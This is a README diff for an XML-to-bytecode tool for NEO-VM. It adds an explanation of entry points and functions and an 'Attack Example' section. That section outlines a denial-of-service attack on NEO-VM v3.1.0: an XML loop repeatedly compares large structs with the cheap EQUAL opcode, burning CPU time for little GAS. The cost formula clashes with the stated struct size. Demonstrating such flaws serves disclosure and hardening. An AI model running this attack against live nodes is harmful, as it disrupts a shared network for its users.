@@ -186,3 +186,77 @@ below are some common attributes can be found in many nodes
 * `val`: used in literal nodes, indicate the value
 * `name`: used as functions, varaibles or some other things' identifier
 * `type`: when used in functions, its value can be chosen from `arg`, `var`, `literal`; when used in literal node, its value can be `int`, `string`, `bytes`, `bool`
+
+## Advanced Usage
+
+As shown in [examples](./examples/) folder, a advanced usage of `Basic` nodes is shown in the third example.
+
+```xml
+<lazy xmlns:b="Basic">
+    <b:entry name="main" />
+    <!-- ... some functions here ... -->
+</lazy>
+```
+
+* The first child in root node is `entry`, which indicate the bytecode's entry point. The entry function must have no argument.
+
+Actually, if the first function is the entry, this line can be omitted.
+
+```xml
+<b:func name="main">
+   <b:var name="obj" />
+   <b:var name="result" />
+
+   <b:literal type="string" val="world" />
+   <b:save name="obj" />
+
+   <b:exec name="do">
+      <b:literal type="string" val="Hello" />
+      <b:load type="var" name="obj" />
+      <b:save type="var" name="result" />
+   </b:exec>
+
+   <b:load name="result" />
+   <b:return />
+</b:func>
+```
+
+The main function contains two variables, the first is called "obj" and the second is called "result".
+
+This function initialize the "obj" by a string literal which value is "world.
+
+Then, `main` call the function `do` with two parameters and accept one return value. The first argument is "Hello" literal and the second literal is variable "obj". `main` accept the returned value in variable "result".
+
+At last, `main` read the "result" variable to the stack.
+
+* Every function must have at least one `return` node, the `return` must be exected as the last instruction.
+
+The `do` function in the example is easy for understanding and will not be shown here, it accept two arguments and return one result using `return` node.
+
+* A function should now leave any new items on the stack unless you know what you're doing.
+
+## Attack Example
+
+The NEO-VM v3.1.0 have an Opcode called `equal`, it's very cheap while can occupy lots of cpu time when using `Struct` with lots of `ByteString`.
+
+The max comparable size of ByteString is 65535 which can be found [here](https://github.com/neo-project/neo-vm/blob/b18e040d2115ed2ea3c9a60ae8722a7865b38927/src/neo-vm/Types/ByteString.cs#L53).
+
+The max StackItems on the stack and struct is 2048 which can be found [here](https://github.com/neo-project/neo-vm/blob/v3.1.0/src/neo-vm/ExecutionEngineLimits.cs#L34).
+
+Therefore, we can construct two structs where each struct contains 1000 large string whose length is 65535.
+
+```xml
+<a:int val="10000" />
+<b:save type="var" name="tmp" />
+<b:dowhile type="var" name="tmp">
+   <b:load type="var" name="s1" />
+   <b:load type="var" name="s2" />
+   <equal />
+   <clear />
+   <b:load type="var" name="tmp" />
+   <dec />
+   <b:save type="var" name="tmp" />
+</b:dowhile>
+```
+
+In the fourth example, the main function's core is the loop, it tests equality in every loop. Therefore, the time consumed will be `loop_times * 65535 * 10000`. But the GAS consumed is a little. The DDOS attack complete.
